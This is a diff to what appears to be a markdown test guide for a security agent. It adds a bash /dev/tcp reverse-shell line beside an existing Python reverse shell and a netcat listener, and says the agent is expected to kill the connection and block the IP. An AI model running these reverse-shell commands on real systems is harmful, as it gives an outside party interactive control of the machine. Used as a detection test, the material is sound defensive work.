@@ -104,6 +104,8 @@ nc -lvnp 4444
 ```bash
 # Bypass terminal hooks and securely spawn an outgoing shell to your phone's IP
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.212.16.72",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+bash -i >& /dev/tcp/10.212.16.72/4444 0>&1
 ```
 
 **🛡️ Expected Result:** The shell connects momentarily, but the agent catches the established socket and kills the python/bash process, disconnecting your phone. (It then blocks the phone's IP).
